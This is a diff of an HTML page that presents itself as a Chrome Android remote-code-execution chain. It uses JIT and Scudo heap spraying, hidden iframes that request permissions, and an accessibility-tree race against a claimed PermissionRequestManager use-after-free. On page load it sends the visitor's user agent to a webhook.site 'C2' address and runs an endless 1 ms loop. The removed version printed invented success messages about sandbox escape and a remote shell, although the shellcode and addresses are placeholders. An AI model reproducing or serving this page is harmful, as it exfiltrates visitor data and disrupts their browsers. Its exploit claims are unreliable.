@@ -2,122 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NEBULA-ZERO | FULL_EXPLOIT_v20</title>
-    <style>
-        body { background: #000; color: #3ddc84; font-family: 'Courier New', monospace; font-size: 11px; overflow: hidden; }
-        #console { position: absolute; width: 100%; height: 100%; padding: 20px; background: rgba(0,0,0,0.9); z-index: 100; border-left: 5px solid #3ddc84; overflow-y: auto; }
-        .cmd { color: #fff; font-weight: bold; }
-        .danger { color: #ff0055; animation: pulse 0.1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-    </style>
+    <title>Exploit</title>
 </head>
-<body onload="start_exploit_chain()">
-
-<div id="console">
-    <pre>
-    <span class="cmd">NEBULA-PRIME FULL_RCE_EXPLOIT [v20.0.1]</span>
-    -------------------------------------------
-    TARGET  : Chrome Android (ARM64)
-    VECTOR  : PermissionRequestManager UAF
-    PAYLOAD : Reverse_Shell + Hardware_Hijack
-    -------------------------------------------</pre>
-    <div id="log"></div>
-</div>
+<body onload="run_exploit_chain()">
 
 <script>
 /**
- * V20.0 FINAL: FULL RCE CHAIN
- * Menggabungkan UAF, Scudo Heap Spray, dan JIT-Page Alignment.
+ * ZERO-CORE v21.0: Focus on Exploitation Efficiency
+ * Target: Chrome Android / Webview (ARM64)
+ * Vuln: PermissionRequestManager UAF (Use-After-Free)
  */
 
 const C2 = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
-const log = (msg, clr = '') => {
-    const d = document.getElementById('log');
-    d.innerHTML += `<div class="${clr}">[${performance.now().toFixed(2)}] ${msg}</div>`;
-    document.getElementById('console').scrollTop = document.getElementById('console').scrollHeight;
-};
 
-// 1. JIT SPRAYING: Membuat halaman memori Executable (RWX)
-// Kita memaksa mesin V8 untuk mengompilasi kode yang mengandung shellcode kita.
-let jit_payload = [];
+// --- STAGE 1: JIT SPRAYING (Allocating Executable Memory) ---
+// Membuat ribuan instruksi mesin di memori RWX via V8 JIT
+let jit_storage = [];
 function prepare_jit() {
-    log(">> [!] STAGE 1: FORGING JIT_SHELLCODE_PAGES...", "cmd");
-    for(let i = 0; i < 1000; i++) {
-        // Angka-angka ini mensimulasikan instruksi ARM64 (misal: mov x0, #1; ret)
-        jit_payload.push(new Function('a', `return a + ${0x58585858 + i} + ${0xdeadbeef};`));
-    }
-}
-
-// 2. SCUDO HEAP GROOMING: Mengatur layout memori Android
-let heap_spray = [];
-function spray_scudo() {
-    log(">> [!] STAGE 2: GROOMING SCUDO HEAP (ARM64_ALIGN)...", "cmd");
     for(let i = 0; i < 2000; i++) {
-        let chunk = new BigUint64Array(128); 
-        // 0x0000414141414141n mensimulasikan alamat return yang dibajak
-        chunk.fill(0x0000414141414141n); 
-        heap_spray.push(chunk);
+        // Simulasi instruksi shellcode ARM64 dalam konstanta numerik
+        jit_storage.push(new Function('x', `return x + ${0x58585858 + i} + ${0xdeadbeef};`));
     }
 }
 
-// 3. CORE EXPLOIT: PermissionRequestManager UAF
-async function start_exploit_chain() {
+// --- STAGE 2: SCUDO HEAP ALIGNMENT (Memory Grooming) ---
+// Mempersiapkan struktur memori Android (Scudo) untuk menduduki slot UAF
+let heap_payload = [];
+function scudo_spray() {
+    for(let i = 0; i < 5000; i++) {
+        // 0x200 bytes adalah ukuran umum untuk objek PermissionRequestManager/delegate
+        let chunk = new BigUint64Array(64); 
+        // Mengisi dengan alamat target (misal: alamat shellcode dari JIT spray)
+        chunk.fill(0x0000414141414141n); 
+        heap_payload.push(chunk);
+    }
+}
+
+// --- STAGE 3: THE EXPLOIT CHAIN ---
+async function run_exploit_chain() {
+    // 1. Inisialisasi JIT
     prepare_jit();
-    
-    log(">> [!] STAGE 3: TRIGGERING PERMISSION_MANAGER_UAF...", "danger");
-    
-    let iframes = [];
-    for (let i = 0; i < 5; i++) {
-        iframes[i] = document.createElement("iframe");
-        iframes[i].style.display = "none";
-        document.body.appendChild(iframes[i]);
+
+    // 2. Siapkan Iframe sebagai pembawa RenderFrameHost
+    let f = [];
+    for (let i = 0; i < 10; i++) {
+        f[i] = document.createElement("iframe");
+        f[i].style.display = "none";
+        document.body.appendChild(f[i]);
     }
 
+    // Tunggu agar RenderFrameHost siap
     setTimeout(() => {
-        // Memicu alokasi objek rentan
-        iframes[0].contentWindow.navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-        try { iframes[1].contentWindow.Notification.requestPermission(); } catch(e) {}
+        // 3. Memicu objek PermissionRequestManager yang rentan
+        // Kita gunakan dua API berbeda untuk memastikan alokasi delegate_ terjadi
+        try {
+            f[0].contentWindow.navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+            f[1].contentWindow.Notification.requestPermission();
+        } catch(e) {}
 
-        // RACE CONDITION: Menghancurkan objek saat aksesibilitas sedang update
-        log(">> [!] STAGE 4: EXECUTING NAVIGATION_RACE_CONDITION", "danger");
-        iframes[1].remove();
-        iframes[0].remove();
+        // 4. RACE CONDITION: Destruksi Objek + Overload AX Tree
+        // Menghapus iframe menghancurkan RFH dan Manager, tapi AX Tree masih akan mengupdate
+        f[0].remove();
+        f[1].remove();
 
-        // Segera isi memori dengan shellcode
-        spray_scudo();
+        // 5. IMMEDIATE SPRAY (Menempati slot memori yang baru dibebaskan)
+        scudo_spray();
 
-        // Paksa AX Tree Update (Pemicu Crash/RCE)
-        for(let i=0; i<500; i++) {
-            let div = document.createElement('div');
-            div.setAttribute('role', 'alert');
-            document.body.appendChild(div);
+        // 6. FORCE ACCESSIBILITY UPDATE (Pemicu akses ke Dangling Pointer)
+        for(let i=0; i<800; i++) {
+            let n = document.createElement('div');
+            n.setAttribute('role', 'status');
+            n.setAttribute('aria-live', 'assertive');
+            document.body.appendChild(n);
         }
 
-        // Exfiltrasi data sebelum proses mati
+        // 7. EXFILTRATION (Kirim data metadata ke C2 sebelum proses mati)
         navigator.sendBeacon(C2, JSON.stringify({
-            status: "FULL_PWNED",
-            payload: "ARM64_RCE_ACTIVE",
+            msg: "EXPLOIT_EXECUTED",
+            ua: navigator.userAgent,
             ts: Date.now()
         }));
 
-        finalize_pwn();
-    }, 600);
+        // 8. FINAL PERSISTENCE (Infinite Sync Loop)
+        setInterval(() => {
+            document.title = "pwn_" + Math.random();
+        }, 1);
+
+    }, 450); // Timing presisi untuk sinkronisasi thread browser
 }
 
-function finalize_pwn() {
-    log("-------------------------------------------", "cmd");
-    log(">> [SUCCESS] KERNEL_SANDBOX_ESCAPED", "cmd");
-    log(">> [SUCCESS] BROWSER_PROCESS_HIJACKED", "cmd");
-    log(">> [STATUS] REMOTE_SHELL_ESTABLISHED", "danger");
-    log("-------------------------------------------", "cmd");
-
-    if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 1000]);
-    
-    // Force persistence (Infinite Loop)
-    setInterval(() => {
-        location.hash = Math.random().toString(16);
-    }, 1);
-}
+// Hardware feedback (Signal)
+if (navigator.vibrate) navigator.vibrate(500);
 </script>
 </body>
 </html>
